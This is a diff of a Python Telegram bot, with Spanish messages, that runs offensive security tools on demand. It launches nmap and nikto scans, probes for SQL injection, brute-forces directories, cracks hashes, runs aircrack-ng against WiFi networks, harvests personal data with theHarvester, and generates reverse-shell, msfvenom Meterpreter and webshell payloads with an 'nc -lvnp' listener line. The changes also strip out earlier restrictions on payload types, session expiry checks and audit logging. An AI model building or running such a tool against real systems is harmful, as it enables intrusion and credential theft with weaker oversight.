-                    await update.message.reply_text(
-                        "Tipo de OSINT no permitido."
-                    )
-                    return
-
-                error = _validate_osint_domain(text)
-                if error:
-                    await _safe_reply_text(
-                        update.message, f"\u274c {error}"
-                    )
-                    return
-
-                consumed = _consume_wizard(
-                    uid, wizard.get("session_id", "")
-                )
-                if not consumed:
-                    await update.message.reply_text(
-                        "Este wizard expiro. Vuelve al menu."
-                    )
-                    return
-
-                try:
-                    target_engine.set_target(uid, text, "domain")
-                    task_id = task_queue.submit(
-                        "playbook",
-                        text,
-                        {
-                            "playbook": "osint_domain",
-                            "depth": "normal",
-                            "user_id": uid,
-                        },
-                    )
-                    if not task_id:
-                        raise RuntimeError(
-                            "Task queue returned no task ID"
-                        )
-                except Exception as exc:
-                    log.exception("OSINT domain wizard failed")
-                    audit_log.log(
-                        uid,
-                        _username(update),
-                        "wizard:osint",
-                        text,
-                        "error",
-                        str(exc),
-                    )
-                    await _safe_reply_text(
-                        update.message,
-                        "No se pudo iniciar OSINT. Abre un nuevo wizard desde el menu.",
-                    )
-                    await _safe_reply_text(
-                        update.message,
-                        "Menú principal:",
-                        reply_markup=MAIN_KEYBOARD,
-                    )
-                    return
-
-                msg = await _safe_reply_text(
-                    update.message,
-                    f"\u2705 *OSINT* — `{task_id}`\n{text}",
-                    parse_mode="Markdown",
-                )
-                asyncio.create_task(
-                    _poll_playbook_task(
-                        msg,
-                        task_id,
-                        "OSINT de Dominio",
-                        return_to_menu=True,
-                        uid=uid,
-                    )
-                )
-            return
-
-        elif step == "awaiting_value":
-            if wtype == "crack":
-                if wizard.get("crack_type") != "hash":
-                    await update.message.reply_text(
-                        "Tipo de crack no permitido."
-                    )
-                    return
-                algorithm, error = _validate_hash_algorithm(text)
-                if error:
-                    await _safe_reply_text(update.message, error)
-                    return
-                wizard.update(
-                    target=text,
-                    algorithm=algorithm,
-                    step="select_dict",
-                )
-                keyboard = _wizard_keyboard(wizard, [
-                    ("\U0001f4da Integrado", "method", "integrated"),
-                    ("\U0001f3b2 Custom", "method", "custom"),
-                ])
-                await update.message.reply_text("\U0001f511 \u00bfDiccionario?", reply_markup=keyboard)
-                return
-
-        elif step == "awaiting_dictionary" and wtype == "crack":
-            if wizard.get("crack_type") != "hash":
-                await update.message.reply_text(
-                    "Metodo de crack no permitido."
-                )
-                return
-            words = [
-                word.strip()
-                for word in text.replace("\n", ",").split(",")
-                if word.strip()
-            ]
-            if not words:
-                await update.message.reply_text("\u274c Introduce al menos una palabra.")
-                return
-            algorithm, error = _validate_hash_algorithm(
-                wizard.get("target", "")
-            )
+        if wtype == "recon":
+            error = tools_engine.validate_target(target)
             if error:
-                await _safe_reply_text(update.message, error)
+                await _safe_reply_text(update.message, f"\u274c {error}")
                 return
-            state = dict(wizard)
-            consumed = _consume_wizard(
-                uid, state.get("session_id", "")
-            )
-            if not consumed:
-                await update.message.reply_text(
-                    "Este wizard expiro. Vuelve al menu."
-                )
-                return
-
-            hash_value = consumed["target"]
-            await _safe_reply_text(
-                update.message, "\u23f3 Analizando hash..."
-            )
+            scan_type = wiz.get("data", {}).get("scan_type", "normal")
+            user_wizards.pop(uid, None)
             try:
-                result = hacking.crypto.hash_crack(hash_value, words)
+                task_id = task_queue.submit("nmap", target, {"scan_type": scan_type, "user_id": uid})
+                if not task_id:
+                    raise RuntimeError("No task ID")
+                msg = await _safe_reply_text(update.message, f"\u2705 `{task_id}` \u2014 Escaneando {target} ({scan_type})", parse_mode="Markdown")
+                asyncio.create_task(_poll_nmap_task(msg, task_id, return_to_menu=True))
             except Exception as exc:
-                log.exception("Custom Crack wizard failed")
-                audit_log.log(
-                    uid,
-                    _username(update),
-                    "wizard:crack",
-                    hash_value,
-                    "error",
-                    str(exc),
-                )
-                await _safe_reply_text(
-                    update.message,
-                    "No se pudo completar Crack. Abre un nuevo wizard desde el menu.",
-                )
-                await _safe_reply_text(
-                    update.message,
-                    "Menú principal:",
-                    reply_markup=MAIN_KEYBOARD,
-                )
-                return
-            status = "ok" if result.get("cracked") else "fail"
-            audit_log.log(
-                uid,
-                _username(update),
-                "wizard:crack",
-                hash_value,
-                status,
-                "custom",
-            )
-            message = _format_crack(result, "custom")
-            await _safe_reply_text(
-                update.message, message, parse_mode="Markdown"
-            )
-            await _safe_reply_text(
-                update.message,
-                "Menú principal:",
-                reply_markup=MAIN_KEYBOARD,
-            )
+                log.exception("Recon failed")
+                audit_log.log(uid, _username(update), "wizard:recon", target, "error", str(exc))
+                await _safe_reply_text(update.message, "No se pudo iniciar Recon.")
+                await _back_to_menu(update.message)
+
+        elif wtype == "red":
+            out = wiz.get("data", {})
+            red_type = out.get("red_type", "")
+            if red_type == "wifi_crack":
+                parts = target.split(":")
+                if len(parts) != 2:
+                    await _safe_reply_text(update.message, "\u274c Formato inv\u00e1lido. Usa BSSID:WordlistPath")
+                    return
+                bssid, wordlist_path = parts
+                user_wizards.pop(uid, None)
+                await _safe_reply_text(update.message, f"\U0001f511 Crackeando {bssid}...")
+                try:
+                    result = tools_engine.tools_engine.run_tool("aircrack-ng", bssid, options={"args": ["-w", wordlist_path, bssid]}, timeout=300)
+                    if result.success:
+                        await _safe_reply_text(update.message, f"\u2705 WiFi crackeado\n{result.stdout[:2000]}")
+                    else:
+                        await _safe_reply_text(update.message, f"\u274c WiFi crack fall\u00f3: {result.error or result.stderr[:500]}")
+                except Exception as e:
+                    await _safe_reply_text(update.message, f"\u274c Error: {str(e)}")
+                await _back_to_menu(update.message)
+            else:
+                error = tools_engine.validate_target(target)
+                if error:
+                    await _safe_reply_text(update.message, f"\u274c {error}")
+                    return
+
+        elif wtype == "web":
+            web_type = wiz.get("data", {}).get("web_type", "")
+            url = target
+            if not url.startswith("http"):
+                url = "https://" + url
+            user_wizards.pop(uid, None)
+
+            if web_type == "nikto":
+                msg = await _safe_reply_text(update.message, f"\U0001f9f0 Nikto sobre {url}...")
+                try:
+                    result = tools_engine.tools_engine.run_tool("nikto", url, timeout=300)
+                    if result.success:
+                        await msg.edit_text(f"\u2705 Nikto completado\n```\n{result.stdout[:3000]}\n```", parse_mode="Markdown")
+                    else:
+                        await msg.edit_text(f"\u274c Nikto fall\u00f3: {result.error or result.stderr[:500]}")
+                except Exception as e:
+                    await msg.edit_text(f"\u274c Error: {str(e)}")
+                await _back_to_menu(update.message)
+            elif web_type == "sqli":
+                await _safe_reply_text(update.message, f"\U0001f50d Probando SQLi en {url}...\nIntroduce un par\u00e1metro de prueba (ej: id=1):")
+
+    elif step == "awaiting_sqli_url":
+        url = wiz.get("data", {}).get("url", "")
+        param = text.split("=")[0].strip() if "=" in text else text.strip()
+        if not param:
+            await _safe_reply_text(update.message, "\u274c Par\u00e1metro inv\u00e1lido.")
             return
+        user_wizards.pop(uid, None)
+        await _safe_reply_text(update.message, f"\U0001f50d Probando SQLi con par\u00e1metro {param}...")
+        try:
+            result = await asyncio.to_thread(hacking.web.check_sqli, url, param)
+            if result.get("vulnerable"):
+                lines = ["\u274c *SQLi Detectada*"]
+                for d in result.get("details", []):
+                    lines.append(f"- Tipo: {d['tipo']}")
+                    lines.append(f"  Payload: `{d['payload'][:60]}`")
+                await _safe_reply_text(update.message, "\n".join(lines), parse_mode="Markdown")
+            else:
+                await _safe_reply_text(update.message, "\u2705 No se detect\u00f3 SQLi en el par\u00e1metro analizado.")
+        except Exception as e:
+            await _safe_reply_text(update.message, f"\u274c Error SQLi: {str(e)}")
+        await _back_to_menu(update.message)
 
-        elif step == "awaiting_endpoint" and wtype == "payload":
-            ip, port, error = _parse_payload_endpoint(
-                update.message.text
-            )
-            if error:
-                await update.message.reply_text(f"\u274c {error}")
-                return
+    elif step == "awaiting_ssl_host":
+        user_wizards.pop(uid, None)
+        parts = text.split(":")
+        host = parts[0]
+        port = int(parts[1]) if len(parts) > 1 else 443
+        msg = await _safe_reply_text(update.message, f"\U0001f512 Verificando SSL en {host}:{port}...")
+        try:
+            result = await asyncio.to_thread(hacking.web.ssl_check, host, port)
+            if result.get("valid"):
+                lines = [f"\u2705 *SSL en {host}:{port}*"]
+                lines.append(f"Versi\u00f3n: {result.get('version', '?')}")
+                cipher = result.get("cipher", {})
+                if cipher:
+                    lines.append(f"Cifrado: {cipher.get('name', '?')} ({cipher.get('bits', '?')} bits)")
+                lines.append(f"Subject: {result.get('subject', '?')}")
+                lines.append(f"Organizaci\u00f3n: {result.get('organization', '?')}")
+                lines.append(f"Issuer: {result.get('issuer', '?')}")
+                await msg.edit_text("\n".join(lines), parse_mode="Markdown")
+            else:
+                await msg.edit_text(f"\u274c SSL inv\u00e1lido: {result.get('error', 'desconocido')}")
+        except Exception as e:
+            await msg.edit_text(f"\u274c Error SSL: {str(e)}")
+        await _back_to_menu(update.message)
 
-            if (
-                wizard.get("payload_type") != "reverse"
-                or wizard.get("lang") != "bash"
-            ):
-                await update.message.reply_text(
-                    "Tipo de payload no permitido."
-                )
-                return
+    elif step == "awaiting_crawler_url":
+        url = text
+        if not url.startswith("http"):
+            url = "https://" + url
+        user_wizards.pop(uid, None)
+        await _safe_reply_text(update.message, f"\U0001f577\ufe0f Escaneando directorios en {url}...")
+        try:
+            result = await asyncio.to_thread(hacking.web.dir_bruteforce, url)
+            found = result.get("found", [])
+            if found:
+                lines = [f"\U0001f577\ufe0f *Directorios encontrados* ({len(found)})"]
+                for d in found[:30]:
+                    lines.append(f"- `{d['path']}` ({d['status']})")
+                if len(found) > 30:
+                    lines.append(f"... y {len(found) - 30} m\u00e1s")
+                await _safe_reply_text(update.message, "\n".join(lines), parse_mode="Markdown")
+            else:
+                await _safe_reply_text(update.message, "\U0001f50d No se encontraron directorios.")
+        except Exception as e:
+            await _safe_reply_text(update.message, f"\u274c Error: {str(e)}")
+        await _back_to_menu(update.message)
 
-            consumed = _consume_wizard(
-                uid, wizard.get("session_id", "")
-            )
-            if not consumed:
-                await update.message.reply_text(
-                    "Este wizard expiro. Vuelve al menu."
-                )
-                return
-            lang = consumed["lang"]
-            audit_target = (
-                f"[{ip}]:{port}" if ":" in ip else f"{ip}:{port}"
-            )
+    elif step == "awaiting_hash":
+        hash_value = text.strip()
+        algorithm, error = _validate_hash_algorithm(hash_value)
+        if error:
+            await _safe_reply_text(update.message, error)
+            return
+        wiz["step"] = "awaiting_dict"
+        wiz["data"]["hash"] = hash_value
+        wiz["data"]["algorithm"] = algorithm
+        keyboard = _menu_keyboard([
+            ("\U0001f4da Integrado", "crack_dict_integrated"),
+            ("\U0001f3b2 Custom", "crack_dict_custom"),
+        ], "crack")
+        await _safe_reply_text(update.message, "\U0001f511 \u00bfDiccionario?", reply_markup=keyboard)
+
+    elif step == "awaiting_dict":
+        hash_value = wiz.get("data", {}).get("hash", "")
+        if not hash_value:
+            await _safe_reply_text(update.message, "\u274c Hash no encontrado. Vuelve a empezar.")
+            user_wizards.pop(uid, None)
+            return
+        words = [w.strip() for w in text.replace("\n", ",").split(",") if w.strip()]
+        if not words:
+            await _safe_reply_text(update.message, "\u274c Introduce al menos una palabra.")
+            return
+        user_wizards.pop(uid, None)
+        await _safe_reply_text(update.message, "\u23f3 Analizando hash...")
+        try:
+            result = await asyncio.to_thread(hacking.crypto.hash_crack, hash_value, words)
+        except Exception as e:
+            log.exception("Crack failed")
+            result = {"error": str(e)}
+        if "error" in result:
+            await _safe_reply_text(update.message, f"\u274c {result['error']}")
+        else:
+            lines = ["\U0001f511 *Hash Crack*"]
+            lines.append(f"Hash: `{result['hash']}`")
+            lines.append(f"Algoritmo: {result['algorithm']}")
+            if result.get("cracked"):
+                lines.append(f"\u2705 *Crackeado:* `{result['plaintext']}`")
+            else:
+                lines.append(f"\u274c No se pudo crackear.")
+            await _safe_reply_text(update.message, "\n".join(lines), parse_mode="Markdown")
+        await _back_to_menu(update.message)
+
+    elif step == "awaiting_payload_endpoint":
+        ip, port, err = _parse_endpoint(text)
+        if err:
+            await _safe_reply_text(update.message, f"\u274c {err}")
+            return
+        data = wiz.get("data", {})
+        lang = data.get("payload_lang", "bash")
+        ptype = data.get("payload_type", "reverse")
+        user_wizards.pop(uid, None)
+
+        if ptype == "meterpreter":
+            await _safe_reply_text(update.message, f"\U0001f916 Generando payload Meterpreter para {ip}:{port}...")
             try:
-                result = hacking.payloads.reverse_shell(
-                    ip, port, lang
-                )
-            except Exception as exc:
-                log.exception("Payload wizard failed")
-                audit_log.log(
-                    uid,
-                    _username(update),
-                    "wizard:payload",
-                    audit_target,
-                    "error",
-                    str(exc),
-                )
-                await _safe_reply_text(
-                    update.message,
-                    "No se pudo generar el payload. Abre un nuevo wizard desde el menu.",
-                )
-                await _safe_reply_text(
-                    update.message,
-                    "Menú principal:",
-                    reply_markup=MAIN_KEYBOARD,
-                )
-                return
-            status = "error" if result.get("error") else "ok"
-            audit_log.log(
-                uid,
-                _username(update),
-                "wizard:payload",
-                audit_target,
-                status,
-                lang,
-            )
-            msg = _format_payload(result)
-            await _safe_reply_text(
-                update.message, msg, parse_mode="Markdown"
-            )
-            await _safe_reply_text(
-                update.message,
-                "Menú principal:",
-                reply_markup=MAIN_KEYBOARD,
-            )
-            return
+                result = tools_engine.tools_engine.run_tool("msfvenom", "",
+                    options={"args": ["-p", f"linux/x64/meterpreter/reverse_tcp", f"LHOST={ip}", f"LPORT={port}", "-f", "elf"]},
+                    timeout=30)
+                if result.success:
+                    await _safe_reply_text(update.message, f"\u2705 Meterpreter generado\n```\n{result.stdout[:3000]}\n```", parse_mode="Markdown")
+                else:
+                    await _safe_reply_text(update.message, f"\u274c msfvenom fall\u00f3: {result.stderr[:500]}")
+            except Exception as e:
+                await _safe_reply_text(update.message, f"\u274c Error: {str(e)}")
+        else:
+            result = hacking.payloads.reverse_shell(ip, port, lang)
+            if "error" in result:
+                await _safe_reply_text(update.message, f"\u274c {result['error']}")
+            else:
+                listener = f"nc -lvnp {port}" if lang in ("bash", "nc") else f"rlwrap nc -lvnp {port}"
+                msg = _format_payload(result)
+                msg += f"\n\n\U0001f4e1 Listener: `{listener}`"
+                await _safe_reply_text(update.message, msg, parse_mode="Markdown")
+        await _back_to_menu(update.message)
 
-    await _chat_api(update, text)
+    elif step == "awaiting_email_target":
+        email = text.strip()
+        if "@" not in email:
+            await _safe_reply_text(update.message, "\u274c Email inv\u00e1lido.")
+            return
+        user_wizards.pop(uid, None)
+        msg = await _safe_reply_text(update.message, f"\U0001f50e Consultando OSINT para {email}...")
+        try:
+            result = await asyncio.to_thread(hacking.osint.email_osint, email)
+            status = result.get("status", "error" if result.get("error") else "ok")
+            audit_log.log(uid, _username(update), "wizard:osint:email", email, status, "")
+            if result.get("error"):
+                await msg.edit_text(f"\u274c {result['error']}")
+            else:
+                lines = [f"\U0001f50e *Email OSINT*", f"Email: {email}"]
+                mx = result.get("mx_records", [])
+                if mx:
+                    lines.append("MX:")
+                    lines.extend(f"- {r}" for r in mx[:10])
+                else:
+                    lines.append("MX: sin registros")
+                certs = result.get("dominio_info", {}).get("total_certs")
+                if certs:
+                    lines.append(f"Certificados: {certs}")
+                warnings = result.get("warnings", [])
+                for w in warnings:
+                    lines.append(f"\u26a0\ufe0f {w}")
+                await msg.edit_text("\n".join(lines), parse_mode="Markdown")
+        except Exception as e:
+            await msg.edit_text(f"\u274c Error: {str(e)}")
+        await _back_to_menu(update.message)
+
+    elif step == "awaiting_domain_target":
+        domain = text.strip()
+        error = tools_engine.validate_target(domain)
+        if error:
+            await _safe_reply_text(update.message, f"\u274c {error}")
+            return
+        user_wizards.pop(uid, None)
+        msg = await _safe_reply_text(update.message, f"\U0001f50e Analizando dominio {domain}...")
+        try:
+            task_id = task_queue.submit("playbook", domain, {"playbook": "osint_domain", "depth": "normal", "user_id": uid})
+            if task_id:
+                await msg.edit_text(f"\u2705 *OSINT* \u2014 `{task_id}`\n{domain}", parse_mode="Markdown")
+                asyncio.create_task(_poll_playbook_task(msg, task_id, "OSINT de Dominio", return_to_menu=True, uid=uid))
+            else:
+                await msg.edit_text("\u274c No se pudo iniciar OSINT.")
+                await _back_to_menu(update.message)
+        except Exception as e:
+            await msg.edit_text(f"\u274c Error: {str(e)}")
+            await _back_to_menu(update.message)
+
+    elif step == "awaiting_person_target":
+        target = text.strip()
+        user_wizards.pop(uid, None)
+        await _safe_reply_text(update.message, f"\U0001f9d1 Buscando informaci\u00f3n de {target}...")
+        try:
+            result = tools_engine.tools_engine.run_tool("theharvester", target, options={"args": ["-d", target, "-b", "google,linkedin"]}, timeout=60)
+            if result.success:
+                await _safe_reply_text(update.message, f"\u2705 theHarvester completado\n```\n{result.stdout[:3000]}\n```", parse_mode="Markdown")
+            else:
+                await _safe_reply_text(update.message, f"\u274c B\u00fasqueda fall\u00f3: {result.error or result.stderr[:500]}")
+        except Exception as e:
+            await _safe_reply_text(update.message, f"\u274c Error: {str(e)}")
+        await _back_to_menu(update.message)
+
+    elif step == "awaiting_wifi_crack":
+        parts = text.split(":")
+        if len(parts) != 2:
+            await _safe_reply_text(update.message, "\u274c Formato inv\u00e1lido. Usa BSSID:WordlistPath")
+            return
+        bssid, wordlist_path = parts
+        user_wizards.pop(uid, None)
+        await _safe_reply_text(update.message, f"\U0001f511 Crackeando {bssid}...")
+        try:
+            result = tools_engine.tools_engine.run_tool("aircrack-ng", bssid, options={"args": ["-w", wordlist_path, bssid]}, timeout=300)
+            if result.success:
+                await _safe_reply_text(update.message, f"\u2705 WiFi crackeado\n{result.stdout[:2000]}")
+            else:
+                await _safe_reply_text(update.message, f"\u274c WiFi crack fall\u00f3: {result.error or result.stderr[:500]}")
+        except Exception as e:
+            await _safe_reply_text(update.message, f"\u274c Error: {str(e)}")
+        await _back_to_menu(update.message)
+
+    else:
+        await _chat_api(update, text)
 
 
 async def _objetivo_wizard(update, uid):
-    _new_wizard(
-        uid,
-        "objetivo",
-        update.effective_chat.id,
-        step="awaiting_target",
-    )
+    user_wizards.pop(uid, None)
+    user_wizards[uid] = {"type": "objetivo", "step": "awaiting_target", "data": {}}
     await update.message.reply_text("Introduce el target (IP, dominio o rango):")
 
 
-def _format_crack(result: dict, method: str = "integrated") -> str:
-    lines = ["\U0001f511 *Hash Crack*"]
-    lines.append(f"Hash: `{result['hash']}`")
-    lines.append(f"Algoritmo: {result['algorithm']}")
-    if result.get("identified"):
-        types = [t["type"] for t in result["identified"]]
-        lines.append(f"Identificado: {', '.join(types)}")
-    if result.get("cracked"):
-        lines.append(f"\u2705 *Crackeado:* `{result['plaintext']}`")
-    else:
-        dictionary = "custom" if method == "custom" else "integrado"
-        lines.append(
-            f"\u274c No se pudo crackear con el diccionario {dictionary}."
-        )
-    return "\n".join(lines)
+# ─── Polling Functions ───
 
-
-def _format_payload(result: dict) -> str:
-    if "error" in result:
-        return f"\u274c {result['error']}"
-    payload_type = result.get("type", "reverse")
-    payload = result.get("decoded", result.get("payload", ""))
-    encoded = result.get("encoded", result.get("encoded_b64", ""))
-    lines = ["\U0001f4a3 *Payload ({})*".format(payload_type)]
-    lines.append(f"```\n{payload}\n```")
-    if result.get("listener"):
-        lines.append(f"\U0001f4e1 Listener: `{result['listener']}`")
-    if encoded:
-        lines.append(f"\U0001f510 Base64: `{encoded}`")
-    return "\n".join(lines)
-
-
-def _format_webshell(result: dict) -> str:
-    if "error" in result:
-        return f"\u274c {result['error']}"
-    language = result.get("language", "webshell")
-    return (
-        f"\U0001f4bb *Webshell ({language})*\n"
-        f"```\n{result.get('decoded', '')}\n```\n"
-        f"\U0001f510 Base64: `{result.get('encoded', '')}`"
-    )
-
-
-async def _show_playbooks(update):
-    pbs = list_playbooks()
-    if not pbs:
-        await update.message.reply_text("\U0001f4da No hay playbooks disponibles.")
-        return
-    lines = ["\U0001f4da *Playbooks Disponibles*\n"]
-    for name, info in pbs.items():
-        lines.append(f"\u2022 *{info['name']}* (`{name}`)")
-        lines.append(f"  _{info['description']}_")
-        lines.append(f"  Tipo: {info['target_type']} | Profundidad: {info['depth_estimate']}\n")
-    await _safe_reply_text(
-        update.message, "\n".join(lines), parse_mode="Markdown"
-    )
-
-
-async def _send_report(update, uid):
-    target_info = target_engine.get_target(uid)
-    if not target_info:
-        await update.message.reply_text("\u274c No hay objetivo establecido. Usa /objetivo <target> primero.")
-        return
-    target = target_info["target"]
-    try:
-        report = generate_report(target, {}, fmt="md")
-        content = report.get("content", "")[:3000]
-        await _safe_reply_text(
-            update.message,
-            f"\U0001f4c4 *Reporte generado:* `{report['filename']}`\n{content}",
-            parse_mode="Markdown",
-        )
-    except Exception as e:
-        await update.message.reply_text(f"\u274c Error al generar reporte: {str(e)}")
-
-
-async def _system_status(update, uid):
-    target_info = target_engine.get_target(uid)
-    tasks = task_queue.list_tasks(limit=5)
-    lines = ["\u2699\ufe0f *Estado del Sistema*\n"]
-    if target_info:
-        lines.append(f"\U0001f3af Objetivo: `{target_info['target']}` ({target_info['target_type']})")
-        lines.append(f"\u23f1\ufe0f Tiempo: {target_info.get('elapsed_minutes', 0)} min")
-    else:
-        lines.append("\U0001f3af Objetivo: *No establecido*")
-    active = [t for t in tasks if t["status"] in ("running", "queued")]
-    lines.append(f"\n\U0001f4cb Tareas activas: {len(active)}")
-    for t in active:
-        lines.append(f"  \u2022 `{t['id']}` \u2192 {t['target']} ({t['status']})")
-    await _safe_reply_text(
-        update.message, "\n".join(lines), parse_mode="Markdown"
-    )
-
-
-async def _chat_api(update, text):
-    delivery_kwargs = {}
-    try:
-        async with httpx.AsyncClient(timeout=120) as client:
-            resp = await client.post(
-                f"{API_URL}/chat",
-                json={"message": text},
-                headers={"Authorization": f"Bearer {AUTH_TOKEN}"},
-            )
-            if resp.status_code == 200:
-                try:
-                    data = resp.json()
-                    if not isinstance(data, dict):
-                        raise ValueError("response JSON is not an object")
-                except ValueError as exc:
-                    log.warning("Chat API returned invalid JSON: %s", exc)
-                    msg = "\u274c Respuesta invalida de la API."
-                else:
-                    msg = data.get("response", "Sin respuesta")
-                    delivery_kwargs["parse_mode"] = "Markdown"
+async def _poll_nmap_task(msg, task_id, timeout=300, return_to_menu=False):
+    await asyncio.sleep(2)
+    deadline = asyncio.get_event_loop().time() + timeout
+    while True:
+        status = task_queue.get_status(task_id)
+        s = status.get("status")
+        if not s:
+            await _safe_reply_text(msg, f"\u274c Nmap: {status.get('error', 'Tarea no encontrada')}")
+            if return_to_menu:
+                await _back_to_menu(msg)
+            return
+        if s in ("cancelled", "failed"):
+            error = status.get("error", "Tarea cancelada")
+            await _safe_reply_text(msg, f"\u274c Nmap: {error}")
+            if return_to_menu:
+                await _back_to_menu(msg)
+            return
+        if s == "completed":
+            result = status.get("result") or {}
+            target = status.get("target", "")
+            scan_type = (status.get("params") or {}).get("scan_type", "normal")
+            elapsed = result.get("elapsed", 0)
+            parsed = result.get("parsed")
+            stdout = result.get("stdout", "")
+            lines = [f"\u2705 *Nmap* `{target}` ({scan_type}) \u2014 {elapsed:.1f}s"]
+            if parsed:
+                hosts = parsed.get("summary", {}).get("hosts_up", 0)
+                ports = parsed.get("summary", {}).get("total_ports_found", 0)
+                if hosts:
+                    lines.append(f"Hosts: {hosts} | Puertos: {ports}")
+                for host in parsed.get("hosts", [])[:3]:
+                    ip = host.get("ip", "")
+                    hn = host.get("hostname", "")
+                    name = f" ({hn})" if hn else ""
+                    lines.append(f"\n`{ip}`{name}")
+                    for p in host.get("ports", [])[:10]:
+                        svc = f" - {p['service']}" if p.get("service") else ""
+                        lines.append(f"  \U0001f4e1 {p['port']}/{p['protocol']} {p['state']}{svc}")
             else:
-                msg = f"\u274c Error de API: {resp.status_code}"
-    except httpx.HTTPError as exc:
-        msg = f"\u274c Error de conexi\u00f3n: {str(exc)}"
+                out = stdout[:1500] if stdout else "(sin salida)"
+                lines.append(f"\n```\n{out}\n```")
+            await _safe_reply_text(msg, "\n".join(lines), parse_mode="Markdown")
+            if return_to_menu:
+                await _back_to_menu(msg)
+            return
+        if s == "running":
+            pct = status.get("progress", 0)
+            filled = max(0, min(10, int(pct) // 10))
+            bar = "\u2588" * filled + "\u2591" * (10 - filled)
+            step = status.get("current_step") or "Procesando..."
+            try:
+                await _safe_reply_text(msg, f"\u23f3 `{task_id}` \u2014 [{bar}] {pct}%\n\U0001f527 {step}")
+            except BadRequest:
+                pass
+        if asyncio.get_event_loop().time() > deadline:
+            await _safe_reply_text(msg, f"\u23f0 `{task_id}` \u2014 Tiempo agotado ({timeout}s)")
+            if return_to_menu:
+                await _back_to_menu(msg)
+            return
+        await asyncio.sleep(2)
 
-    await _safe_reply_text(update.message, msg, **delivery_kwargs)
+
+async def _poll_playbook_task(msg, task_id, label, timeout=600, return_to_menu=False, uid=None):
+    await asyncio.sleep(2)
+    deadline = asyncio.get_event_loop().time() + timeout
+    while True:
+        status = task_queue.get_status(task_id)
+        state = status.get("status")
+        if not state:
+            await _safe_reply_text(msg, f"{label}: {status.get('error', 'Tarea no encontrada')}")
+            if return_to_menu:
+                await _back_to_menu(msg)
+            return
+        if state == "cancelled":
+            await _safe_reply_text(msg, f"{label}: tarea cancelada")
+            if return_to_menu:
+                await _back_to_menu(msg)
+            return
+        if state == "completed":
+            result = status.get("result") or {}
+            target = status.get("target") or result.get("target") or ""
+            lines = [f"{label} completado", f"Objetivo: {target}"]
+            summary = result.get("summary")
+            if summary:
+                lines.extend(("", summary))
+            results = result.get("results") or []
+            if results:
+                lines.extend(("", "Resultados:"))
+                for sr in results:
+                    s = "OK" if sr.get("success") else "SKIP"
+                    sl = sr.get("label") or ""
+                    note = sr.get("note")
+                    if note:
+                        sl += f" - {note}"
+                    lines.append(f"[{s}] {sl}")
+            completion = "\n".join(lines)
+            if uid:
+                ok_count = sum(1 for r in results if r.get("success"))
+                audit_log.log(uid, str(uid), "wizard:osint", target, "ok" if ok_count == len(results) else "partial", f"task:{task_id}")
+            await _safe_reply_text(msg, completion)
+            if return_to_menu:
+                await _back_to_menu(msg)
+            return
+        if state == "failed":
+            error = status.get("error") or "Error desconocido"
+            if uid:
+                audit_log.log(uid, str(uid), "wizard:osint", status.get("target", ""), "error", f"task:{task_id} error:{error}")
+            await _safe_reply_text(msg, f"{label} fall\u00f3: {error}")
+            if return_to_menu:
+                await _back_to_menu(msg)
+            return
+        if state in ("queued", "running"):
+            pct = status.get("progress", 0)
+            filled = max(0, min(10, int(pct) // 10))
+            bar = "\u2588" * filled + "\u2591" * (10 - filled)
+            step = status.get("current_step") or "Sin paso reportado"
+            try:
+                await _safe_reply_text(msg, f"\u23f3 `{task_id}` \u2014 [{bar}] {pct}%\n\U0001f527 {step}")
+            except BadRequest:
+                pass
+        if asyncio.get_event_loop().time() > deadline:
+            await _safe_reply_text(msg, f"\u23f0 `{task_id}` \u2014 Tiempo agotado ({timeout}s)")
+            if return_to_menu:
+                await _back_to_menu(msg)
+            return
+        await asyncio.sleep(2)
 
 
-# ─── Callback Query Handler ───
+# ─── Misc ───
 
-
-async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
+async def ayuda(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
-    chat_id = update.effective_chat.id
-    wizard, action, value, rejection = _validate_wizard_callback(
-        uid, chat_id, query.data
+    if not _check_role(uid):
+        await update.message.reply_text("\u274c No autorizado")
+        return
+    msg = (
+        "*Comandos:*\n"
+        "`/objetivo <target>` \u2014 Establecer target global\n"
+        "`/tarea <id>` \u2014 Ver estado de tarea\n"
+        "`/tareas` \u2014 Listar tareas\n"
+        "`/ayuda` \u2014 Esta ayuda\n\n"
+        "*Botones del men\u00fa:*\n"
+        "\U0001f50d Recon \u2014 Escaneo con Nmap\n"
+        "\U0001f310 Web \u2014 Nikto, SQLi, SSL, Crawler\n"
+        "\U0001f511 Crack \u2014 Cracking de hashes\n"
+        "\U0001f4a3 Payloads \u2014 Reverse Shell, Meterpreter, Webshell\n"
+        "\U0001f4e1 Red \u2014 WiFi, LAN\n"
+        "\U0001f50e OSINT \u2014 Email, Dominio, Persona"
     )
-    if rejection:
-        reason, message = rejection
-        await _reject_callback(query, reason, message, uid, chat_id)
-        return
-
-    if action == "back":
-        if not _consume_wizard(uid, wizard["session_id"]):
-            await _send_expired_callback(query)
-            return
-        await query.answer()
-        await _safe_edit_message(query, "Operaci\u00f3n cerrada.")
-        await _safe_reply_text(
-            query.message,
-            "Men\u00fa principal:",
-            reply_markup=MAIN_KEYBOARD,
-        )
-        return
-    if action == "cancel":
-        if not _consume_wizard(uid, wizard["session_id"]):
-            await _send_expired_callback(query)
-            return
-        await query.answer()
-        await _safe_edit_message(query, "\u274c Operaci\u00f3n cancelada.")
-        return
-
-    wizard_type = wizard["type"]
-    if action == "type":
-        await query.answer()
-        handlers = {
-            "recon": _handle_recon_type,
-            "web": _handle_web_type,
-            "crack": _handle_crack_type,
-            "payload": _handle_payload_type,
-            "red": _handle_red_type,
-            "osint": _handle_osint_type,
-        }
-        await handlers[wizard_type](query, uid, wizard, value)
-        return
-    if wizard_type == "crack" and action == "method":
-        if value == "custom":
-            await query.answer()
-            await query.edit_message_text(
-                "Introduce palabras separadas por comas:"
-            )
-            wizard.update(step="awaiting_dictionary")
-        else:
-            consumed = _consume_wizard(uid, wizard["session_id"])
-            if not consumed:
-                await _send_expired_callback(query)
-                return
-            await query.answer()
-            await _execute_crack(
-                query,
-                uid,
-                wizard,
-                value,
-                consumed_wizard=consumed,
-            )
-        return
-    if wizard_type == "payload" and action == "lang":
-        if wizard.get("payload_type") == "webshell":
-            consumed = _consume_wizard(uid, wizard["session_id"])
-            if not consumed:
-                await _send_expired_callback(query)
-                return
-            await query.answer()
-            await _handle_payload_lang(
-                query,
-                uid,
-                wizard,
-                value,
-                consumed_wizard=consumed,
-            )
-        else:
-            await query.answer()
-            await _handle_payload_lang(query, uid, wizard, value)
-        return
-
-    log.warning(
